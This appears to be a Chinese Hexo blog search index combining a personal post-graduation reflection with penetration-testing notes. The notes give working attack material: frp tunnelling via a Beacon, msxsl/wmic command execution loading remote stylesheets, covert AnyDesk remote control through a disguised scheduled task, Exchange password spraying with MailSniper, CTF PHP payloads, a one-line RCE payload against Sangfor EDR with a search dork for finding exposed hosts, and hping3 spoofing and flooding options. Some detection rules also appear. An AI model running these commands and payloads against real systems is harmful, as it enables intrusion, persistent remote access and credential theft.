<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[毕业随想]]></title>
    <url>%2Fposts%2F4544%2F</url>
    <content type="text"><![CDATA[本文纯粹是我毕业之后一些内心的想法，想到哪写到哪 自打毕业以来，心情就很烦闷，一直想找个机会写写，但是每到提笔就不知道从何写起。 每天朝九晚六的，下班就回到出租屋，偶尔出去锻炼锻炼，一点动力也找不回来了，是我到底怎么了还是到底怎么了？ 怎么说呢，就是很不适应这种生活，本以为IT行业，安全行业，都是简简单单的人，相处着应该就挺省心的，但是自打来了项目上，就一直被一个领导（名义上的导师吧，虽然他从来没管过我之类的）冷漠，就感觉在他眼里我啥也不会似的，啥时候也不会安排你任务，也不会和你交流，他有啥事情只和另一个实习了一年今年刚转正的新人交流啊傻的。我就很不痛快，就很没有存在感，就感觉被抛弃了一样。 本来驻场的项目就不跟在公司总部一样能感受到公司的关怀，更何况刚毕业就来到了这种地方（可能也是自己求职时候能力不太好吧），就接触的就那么三五个人，更感觉没有归属感，好想逃离。而且我技术不比同事差，但是工资还比旁边的同事低不少，更不平衡了。每个月挣那仨瓜俩枣的，都不敢咋花钱呢就没有什么富余了，想想未来要负担的，看不到未来的出路在哪里，日复一日、碌碌无为、没有奔头、没有希望。 其实好想再考一次研，但是内心一直不能够坚定下来，而且现在确实时间也不多了，机会越来越渺茫。 我一直战胜不了数学这个东西，前两天和一个同学聊天，他说那是我没有认真学是我懒，但是我大四时候每天也是整天的学习啊，虽然我承认当时学数学的时候是一点目的都没有，学的很盲目，所以才考了30多分。如果换个学科，我能换什么呢？继续学我的GIS？还是计算机？我未来到底想干什么？我好像一点职业规划都没有了… … 现在还真的有点羡慕那些去国企、事业单位、国家机关的同学的，真的稳稳定定的啥也不用愁，每天做完不太繁忙的工作之余，还能找点想做的事情或者去赚个外快多好，或者混个好学历，当个大学老师多好。 其实私企也挺好，至少挣钱多啊（前提是能力好，有特长），为什么我至今没有发现我到底擅长什么？真的好想有个大师给我点拨一下，什么方向感兴趣，擅长什么东西… … 至少知道了之后，哪怕坎坷点也会坚定得走下去。 好想把自己灌醉，但是酒醒后该面对的还是要面对，一点用都没有…… 越想越复杂，越想越不知道什么什么了… … document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>碎碎念</tag>
        <tag>毕业</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[frp]]></title>
    <url>%2Fposts%2F23493%2F</url>
    <content type="text"><![CDATA[下载地址：https://github.com/fatedier/frp.git 跨平台，根据自己情况选择使用 配置文件服务端 客户端 部署服务端连接到vps上，后台启动服务端 nohup ./frps -c frps.int &amp; jobs -l cat frps.log 客户端将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行 frpc.exe -c frpc.int 当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到 但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作， 所以可结合execute在目标机无输出执行程序。 sleep 10 execute c:/frpc.exe -c c:/frpc.ini shell netstat -ano |findstr 7007 WindowsWindows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果。 Frp的用法比较灵活且运行稳定。如可将frp服务端挂在”肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等，实战中可自由发挥。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>frp</tag>
        <tag>内网穿透</tag>
        <tag>端口转发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSL Script Processing]]></title>
    <url>%2Fposts%2F45834%2F</url>
    <content type="text"><![CDATA[XSL是指扩展样式表语言(Extension Stylesheet Language) msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=21714 执行该工具需要用到2个文件，分别为XML及XSL文件，msxsl命令行接受参数形式如下： msxsl.exe {xmlfile} {xslfile} # 调用文件内的命令 msxsl.exe {xslfile} {xslfile} 命令执行技术复现（MSXSL.EXE）本地执行test.xml &lt;?xml version="1.0"?> &lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?> &lt;customers> &lt;customer> &lt;name>Microsoft&lt;/name> &lt;/customer> &lt;/customers> exec.xsl &lt;?xml version="1.0"?> &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace"> &lt;msxsl:script language="JScript" implements-prefix="user"> function xml(nodelist) { var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe"); //这里可以改造为执行你的木马文件如： // var r = new ActiveXObject("WScript.Shell").Run("cmd /k cd c:\ &amp; shell.exe"); return nodelist.nextNode().xml; } &lt;/msxsl:script> &lt;xsl:template match="/"> &lt;xsl:value-of select="user:xml(.)"/> &lt;/xsl:template> &lt;/xsl:stylesheet> 执行 msxsl.exe test.xml exec.xsl 远程执行msxsl.exe https://raw.githubusercontent.com/xx/master/test.xml https://raw.githubusercontent.com/xx/master/exec.xsl 技术复现（WMIC.EXE）wmic可通过如下方式执行xsl内的恶意代码 wmic.exe {wmic_cmd} /FORMAT:{xsl_file} 本地执行wmic.exe process get name /format:exec.xsl 远程执行wmic.exe process get name /format:http:/www.xxx.com/exec.xsl https://www.cnblogs.com/backlion/p/10489916.html 威胁检测数据源： 进程监视、进程命令行参数、网络的进程使用、DLL监视 msxsl.exe进程特征： # 当msxsl.exe作为父进程创建其他进程时视为可疑 ParentImage regex '^.*msxsl\.exe$' 加载项特征： #当msxsl.exe加载jscript.dll时视为可疑 Image regex '^.*msxsl\.exe$' AND ImageLoaded contains 'jscript.dll' wmic.exe加载项特征 #当wmic.exe加载jscript.dll时视为可疑 Image regex '^.*wmic\.exe$' AND ImageLoaded contains 'jscript.dll' 通过MSXSL方式进行鱼叉式网络钓鱼有年头的参考文章：https://www.anquanke.com/post/id/159316 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>XSL Script Processing</tag>
        <tag>MSXSL.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用anydesk做远控]]></title>
    <url>%2Fposts%2F15621%2F</url>
    <content type="text"><![CDATA[anydesk是类似teamviewer的远程管理软件，但是他不用安装且体积小 场景举例 有云锁，护卫神等禁止3389登录时 类似阿里云这种，登录3389会报警 连接内网中可以出网的windows机器 注意事项 启动anydesk的权限需要桌面用户权限，比如，IIS做中间件的环境中，拿到了webshell一般都是没有桌面用户权限的，如果启动anydesk不会成功 启动anydesk时桌面不能被注销 有可能连接上去是黑屏，这个是因为该桌面用户退出远程桌面但没有注销，此时，除非能用winlogon启动anydesk，否则没法使用屏幕 使用方法 习惯性的使用https://www.virustotal.com/gui扫描一下 假设获取到了目标系统的一个msf的shell `bash 下载anydesk到一个公共目录下(New-Object System.Net.WebClient).DownloadFile(“https://download.anydesk.com/AnyDesk.exe?_ga=2.176752485.1141763109.1599703967-925913843.1599703967","C:\Users\Public\Desktop\anydesk.exe") 确定有哪些用户正在使用桌面???(((Get-WmiObject -Class Win32_Process -Filter ‘Name=”explorer.exe”‘).GetOwner().)) 启动一个计划任务，启动的用户为上个步骤选中的用户???schtasks /Create /TN Windwos_Security_Update /SC monthly /tr “c:.…..” 先执行一次计划任务，生成配置文件schtasks /run /tn Windwos_Security_Update 等待几秒，等anydesk成功连接到网络，再把anydesk进程杀掉，dir看用户下面是否生成配置文件，然后再service.conf里面的添加密码(AnyDeskGetAccess) 查看anydeskID并启动anydesk不需要到目标机器上点击接受，输入密码即可分享一个高权限webshell下可以使用的powershell脚本 ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>远控</tag>
        <tag>anydesk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mailsniper.ps1]]></title>
    <url>%2Fposts%2F27598%2F</url>
    <content type="text"><![CDATA[下载地址：https://github.com/dafthack/MailSniper.git mailsniper.ps1获取outlook所有联系人 收集邮箱，为后续爆破准备 前提掌握其中一个用户邮箱的账户密码，并可以登录outlook 利用命令格式 # 在域内机器上执行 powershell -exec bypass Import-Module .\MailSniper.ps1 Get-GlobalAddressList -ExchHostname outlook地址 -UserName 域名\域用户名 -Password 已知的邮箱密码 -OutFile 导出结果.txt 1.目标outlook搭建在自己的服务器上 ExchHostname指向自己的邮箱服务器地址即可 2.目标outlook在office365中 一样的道理，只不过把ExchHostname指向outlook.office365.com即可，username使用完整的邮箱，而不仅仅是用户名。 爆破exchange（指定密码爆破邮箱）powershell -exec bypass Import-Module .\MailSniper.ps1 Invoke-PasswordSprayEWS -ExchHostname owa2013.rootkit.org -UserList .\users.txt -Password Admin12345 -ExchangeVersion Exchange2013_SP1 # -ExchHostname：ping -a exchange服务器ip -> 得到主机名 -> 主机名拼接域名（如：owa2013.rootkit.org） # -ExchangeVersion：若不知道可先不指定 MailSniper检索邮件内容Mailsniper包含两个主要的cmdlet，分别是Invoke-SelfSearch和Invoke-GlobalMailSearch，用于检索邮件中的关键字。 ## 查找当前用户的Exchange邮箱数据 Invoke-SelfSearch -Mailbox zhangsan@fb.com -Terms *机密* -Folder 收件箱 -ExchangeVersion Exchange2013_SP1 # 查找邮件内容中包含pwn字符串的邮件，-Folder参数可以指定要搜索的文件夹，默认是inbox，使用时最好指定要搜索的文件夹名称（或者指定all查找所有文件），因为该工具是外国人写的，Exchange英文版收件箱为Inbox，当Exchange使用中文版时收件箱不为英文名，默认查找inbox文件夹会因找不到该文件而出错 ## 查找所有用户的Exchange邮箱数据 Invoke-GlobalMailSearch -ImpersonationAccount zhangsan -ExchHostname test2k12 -AdminUserName fb.com\administrator -ExchangeVersion Exchange2013_SP1 -Term "*内部邮件*" -Folder 收件箱 # 利用administrator管理员用户为普通用户zhangsan分配ApplicationImpersonation角色，检索所有邮箱用户的邮件中，包括“内部邮件”关键字的内容 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
        <tag>mailsniper.ps1</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源情报信息搜索(OSINT)]]></title>
    <url>%2Fposts%2F37%2F</url>
    <content type="text"><![CDATA[搜索引擎语法 百度 谷歌 必应 在线接口 http://cebaidu.com/index/getRelatedSites?site_address=baidu.com http://www.webscan.cc/ http://sbd.ximcx.cn/ https://censysio/certificates?q=example.com https://crt.sh/?q=%25example.com https://github.com/cOny1WorkScripts/tree/master/get-subdomain-from-baidu https://dnsdumpster.com/ https://ww.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com https://findsubdomains.com/ https://dnslytics.com/search?q=www.baidu.com https://pentest-tools.com/information-gathering/find-subdomains-of-domain https://viewdns.info/ https://www.ipneighbour.com#/lookup/114.114.114.114 https://securitytrails.com/list/apex_domain/baidu.com https://url.fht.im/ http://api.hackertarget.com/hostsearch/?q=baidu.com http://ww.yunseecn/finger.html 相关工具https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md DNS历史解析记录… … Github Hacking可以搜索以下类型的信息：Repositories,Topics,Issues and pull requests,Code,Commits,Users,Wikis 搜索仓库> exp stars:>1000 # 匹配关键字"exp"且star大于1000的仓库 >= exp topics:>=5 # 匹配关键字"exp"且标签数量大于等于5的仓库 &lt; exp size:>=1000 # 匹配关键字"exp"且文件大于1KB的仓库 &lt;= n..* exp stars:1000..* # 匹配关键字"exp"且star大于等于1000的仓库 *..n exp stars:*..1000 # 匹配关键字"exp"且star小于等于1000的仓库 n..n exp stars:10..1000 # 匹配关键字"exp"且star大于10并小于1000的仓库 其他语法类似… … 搜索代码注意事项 - 只能搜索小于384 KB的文件。 - 只能搜索少于500,000个文件的存储库。 - 登录的用户可以搜索所有公共存储库。 - 除filename 搜索外，搜索源代码时必须至少包含-一个搜索词。 例如，搜索language:javascript无效，而是这样: amazing language :javascript。 - 搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。 - 您不能将以下通配符用作搜索查询的一部分:， ，: ; /\'"=*!?#$&amp;+^|~&lt;>(){}[]。搜索将忽略这些符号。 日期条件 exp pushed:&lt;2020-08-08 # 搜索在2020年8月8日前push的代码,关键字是exp exp pushed:2020-05-05..2020-08-08 # 日期区间 exp created:>=2020-08-08 # 创建时间 逻辑运算 AND OR NOT 排除运算 exp pushed:&lt;2020-08-08 -language:java # 搜索在2020年8月8日前push的代码，关键字是exp，排除java语言的仓库 包含搜索 exp in:file # 搜索文件中包含exp的代码 exp in:path # 搜索路径中包含exp的代码 exp in:file,path # 搜索文件、路径中包含exp的代码 console path:app/public language:javascript # 搜索关键字console,语言为js，在app/public下的代码 主体搜索 user:USERNAME # 用户名搜索 org:ORGNAME # 组织搜索 repo:USERNAME/REPOSITORY # 指定仓库搜索 文件大小 size:>1000 # 搜索大于1KB的文件 文件名称 filename :config.php language:php # 搜索文件名为config.php,且语言为php的代码 # 例如搜索Java项目配置文件: mail filename:.properties 拓展名 extension:EXTENSION # 指定扩展名搜索 # 例如: extension:properties jdbc 自动化工具https://github.com/UnkL4b/GitMiner # 简单用法 # -r 正则， -q 查询关键字 python3 gitminer-v2.0.py -C cookie.txt -q 'extension:properties jdbc' -r 'password(.*)' -m passwords document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>情报信息搜索</tag>
        <tag>Githun Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开放漏洞情报]]></title>
    <url>%2Fposts%2F28882%2F</url>
    <content type="text"><![CDATA[常用网站 CVE Exploit-DB CX Security CNVD Security tracker Search Exploit-DBkali中自带 searchsploit # 搜索Windows提权漏洞 searchsploit -t windows local # 搜索Apache漏洞 searchsploit -t apache document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>开放漏洞情报</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字典生成-pydictor]]></title>
    <url>%2Fposts%2F31240%2F</url>
    <content type="text"><![CDATA[一个强大实用的黑客暴力破解字典建立工具 地址：https://github.com/LandGrey/pydictor.git 简单示例生成字典 python pydictor.py --sedb 合并去重 python pydictor.py -tool uniqbiner /my/all/dict/ 多字典文件组合工具 python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt 使用pydictor有个窍门： 时刻清楚你想要什么样子的字典. #### pydictor可以生成的所有字典的类型及其说明 归属 类别 标识符 描述 支持功能代号 core base C1 基础字典 F1 F2 F3 F4 core char C2 自定义字符集字典 F1 F2 F3 F4 core chunk C3 排列组合字典 ALL core conf C4 配置语法生成字典 ALL core extend C5 规则扩展字典 ALL core sedb C6 社会工程学字典 ALL tool combiner T1 字典合并工具 tool comparer T2 字典比较相减工具 ALL tool counter T3 词频统计工具 ALL tool handler T4 筛选处理原有字典工具 ALL tool uniqbiner T5 先合并后去重工具 ALL tool uniqifer T6 字典去重工具 ALL tool hybrider T7 多字典文件组合工具 F1 F2 F3 F4 plugin birthday P1 生日日期字典插件 ALL plugin ftp P2 关键词生成ftp密码字典插件 ALL plugin pid4 P3 身份证后四位字典插件 ALL plugin pid6 P4 身份证后六位字典插件 ALL plugin pid8 P5 身份证后八位字典插件 ALL plugin scratch P6 网页原始关键词字典插件 ALL 字典操作功能及说明对照表 功能 功能代号 说明 len F1 定义长度范围 head F2 添加前缀 tail F3 添加后缀 encode F4 编码或自定义加密方法 occur F5 字母、数字、特殊字符出现次数范围筛选 types F6 字母、数字、特殊字符各种类数范围筛选 regex F7 正则筛选 level F8 字典级别筛选 leet F9 1337 模式 repeat F10 字母、数字、特殊字符连续出现次数范围筛选 支持的编码或加密方式 方式 描述 none 默认方式, 不进行任何编码 b16 base16 编码 b32 base32 编码 b64 base64 编码 des des 算法, 需要根据情况修改代码 execjs 执行本地或远程js函数, 需要根据情况修改代码 hmac hmac 算法, 需要根据情况修改代码 md5 md5 算法输出32位 md516 md5 算法输出16位 rsa rsa 算法 需要根据情况修改代码 sha1 sha-1 算法 sha256 sha-256 算法 sha512 sha-512 算法 url url 编码 test 一个自定义编码方法的示例 --encode b64 occur 功能用法 : --occur [字母出现次数的范围] [数字出现次数的范围] [特殊字符出现次数的范围] 示例: --occur "&gt;=4" "&lt;6" "==0" types 功能用法 : --types [字母种类的范围] [数字种类的范围] [特殊字符种类的范围] 示例: --types "&lt;=8" "&lt;=4" "=0" repeat 功能用法 : --repeat [字母连续出现次数范围] [数字连续出现次数范围] [特殊字符连续出现次数范围] 示例: --repeat "&lt;=3" "&gt;=3" "==0" regex 功能用法 : --regex [正则表达式] 示例: --regex "^z.*?g$" level 功能用法 : --level [level] 示例: --level 4 /funcfg/extend.conf配置文件中level大于等于4的项目会被启用 leet功能默认置换表leet字符 = 替换字符，可以修改/funcfg/leet_mode.conf更改替换表 a = 4 b = 6 e = 3 l = 1 i = 1 o = 0 s = 5 模式代码0 默认模式，全部替换 1 从左至右, 将第一个遇到的leet字符全部替换 2 从右至左, 将第一个遇到的leet字符全部替换 11-19 从左至右, 将第一个遇到的leet字符最多替换 code-10 个 21-29 从右至左, 将第一个遇到的leet字符最多替换 code-20 个 代码作用表 代码 原字符串 被替换后的新字符串 0 as a airs trees 45 4 41r5 tr335 1 as a airs trees 4s 4 4irs trees 2 as a airs trees a5 a air5 tree5 11 as a airs trees 4s a airs trees 12 as a airs trees 4s 4 airs trees 13 as a airs trees 4s 4 4irs trees 14 as a airs trees 4s 4 4irs trees … as a airs trees 4s 4 4irs trees 21 as a airs trees as a airs tree5 22 as a airs trees as a air5 tree5 23 as a airs trees a5 a air5 tree5 24 as a airs trees a5 a air5 tree5 … as a airs trees a5 a air5 tree5 参考：https://cloud.tencent.com/developer/article/1180351 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php变量覆盖]]></title>
    <url>%2Fposts%2F50639%2F</url>
    <content type="text"><![CDATA[可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞 场景 $$使用不当 extract()函数使用不当 parse_str()函数使用不当 import_request_variables()使用不当 开启了全局变量注册 … … 1. $$导致的变量覆盖 经常在foreach中出现 使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值 &lt;?php //?name=test //output:string(4) “name” string(4) “test” string(4) “test” test $name='thinking'; foreach ($_GET as $key => $value) $$key = $value; var_dump($key); var_dump($value); var_dump($$key); echo $name; ?> 例题： &lt;?php include "flag.php"; $_403 = "Access Denied"; $_200 = "Welcome Admin"; if ($_SERVER["REQUEST_METHOD"] != "POST") die("BugsBunnyCTF is here :p…"); if ( !isset($_POST["flag"]) ) die($_403); foreach ($_GET as $key => $value) key = value; foreach ($_POST as $key => $value) $$key = $value; if ( $_POST["flag"] !== $flag ) die($_403); echo "This is your flag : ". $flag . "\n"; die($_200); ?> 2. extract()函数导致的变量覆盖extract() 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 语法： extract(array,extract_rules,prefix) extract 有三种形式可能导致变量覆盖: 第一种是第二个参数为EXTR_OVERWRITE,他表示如果有冲突，覆盖原有的变量。 第二种情况是只传入第一个参数，默认为EXTR_OVERWRITE模式。 第三种是第二个参数为EXTR_IF_EXISTS，他表示在当前符号表中已有同名变量时，覆盖它们的值,其他的都不注册新变量. 例题1 &lt;?php $flag = 'xxx'; extract($_GET); if (isset($gift)) { $content = trim(file_get_contents($flag)); if ($gift == $content) { echo 'hctf{…}'; } else { echo 'Oh..'; } } ?> //GET请求 ?flag=&amp;gift=，extract()会将$flag和$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足$gift == $content。 //payload: ?flag=&amp;gift= 例题2 &lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?> &lt;?php extract($_POST); if ($pass == $thepassword_123) { ?> &lt;div class=”alert alert-success”> &lt;code>&lt;?php echo $theflag; ?>&lt;/code> &lt;/div> &lt;?php } ?> &lt;?php } ?> //extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖$pass和$thepassword_123变量的值，从而满足$pass == $thepassword_123这个条件。 // POST Payload: //pass=&amp;thepassword_123= 3. parse_str函数导致的变量覆盖parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 语法：parse_str(string,array) 例题1： &lt;?php error_reporting(0); if (empty($_GET['id'])) { show_source(__FILE__); die(); } else { include ('flag.php'); $a = "www.OPENCTF.com"; $id = $_GET['id']; @parse_str($id); if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) { echo $flag; } else { exit('其实很简单其实并不难！'); } } ?> //0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a //利用php弱语言特性, //使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到 0e462097431906509019562988736854 与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件，得到flag。 最终PAYLOAD： GET DATA: ?id=a[0]=s878926199a or ?id=a[0]=240610708 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[isset数组绕过]]></title>
    <url>%2Fposts%2F57106%2F</url>
    <content type="text"><![CDATA[1.数组返回NULL绕过&lt;?php $flag = "flag"; if (isset ($_GET['password'])) { if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) echo 'You password must be alphanumeric'; else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag); else echo 'Invalid password'; } ?> php不能处理数组 根据 if (strpos ($_GET['password'], '--') !== FALSE) 知道password一定有'--'。开始构造%2d但是过不了，根据题目暗示和php特性可以传一个数组绕过判断 http://123.206.87.240:9009/19.php?password[]=sad%2d%2d strpos() 函数查找字符串在另一字符串中第一次出现的位置。 注释：strpos() 函数对大小写敏感。 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 2.&lt;?php $flag = "flag"; if (isset ($_GET['ctf'])) { if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE) //① echo '必须输入数字才行'; else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE) //② die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; } ?> 思路： ereg()只能处理字符串的，遇到数组做参数返回NULL，判断用的是 === ，其要求值与类型都要相同，而NULL跟FALSE类型是不同的,所以①判断if不成立，继续执行②，这时strpos函数遇到数组，也返回NULL，与FALSE类型不同，if条件成立，输出flag。所以payload应该是?ctf[]=任意字符,甚至就是?ctf[]= document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>isset</tag>
        <tag>数组绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深X服 EDR终端检测系统RCE漏洞复现]]></title>
    <url>%2Fposts%2F37031%2F</url>
    <content type="text"><![CDATA[简介深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 EDR的界面 RCE Payloadhttps://xxx.com:xxx/tool/log/c.php?strip_slashes=system&amp;host=id Fofa关键字title="终端检测响应平台" document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>深信服</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hping3]]></title>
    <url>%2Fposts%2F18271%2F</url>
    <content type="text"><![CDATA[hping3主要是测试防火墙的拦截规则，对网络设备进行测试 主要功能 防火墙测试（参考：http://0daysecurity.com/articles/hping3_examples.html） 端口扫描 Idle扫描 拒绝服务攻击 文件传输 木马功能 …… 主要参数 -h --help 显示帮助 -v --version 显示版本 -c --count 发送数据包的数目 -i --interval 发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000) --fast 等同 -i u10000 (每秒10个包) --faster 等同 -i u1000 (每秒100个包) --flood 尽最快发送数据包，不显示回复。 -n --numeric 数字化输出，象征性输出主机地址。 -q --quiet 安静模式 -I --interface 网卡接口 (默认路由接口) -V --verbose 详细模式 -D --debug 调试信息 -z --bind 绑定ctrl+z到ttl(默认为目的端口) -Z --unbind 取消绑定ctrl+z键 --beep 对于接收到的每个匹配数据包蜂鸣声提示 模式选择 default mode TCP // 默认模式是 TCP -0 --rawip RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。 -1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。 -2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。 -8 --scan SCAN mode. //扫描模式 指定扫描对应的端口。 Example: hping --scan 1-30,70-90 -S www.target.host // 扫描 -9 --listen listen mode // 监听模式 IP 模式 -a --spoof spoof source address //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。 --rand-dest random destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令 --rand-source random source address mode. see the man. // 随机源地址模式。详细使用 man 命令 -t --ttl ttl (默认 64) //修改 ttl 值 -N --id id (默认 随机) // hping 中的 ID 值，缺省为随机值 -W --winid 使用win* id字节顺序 //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。 -r --rel 相对id字段(估计主机流量) 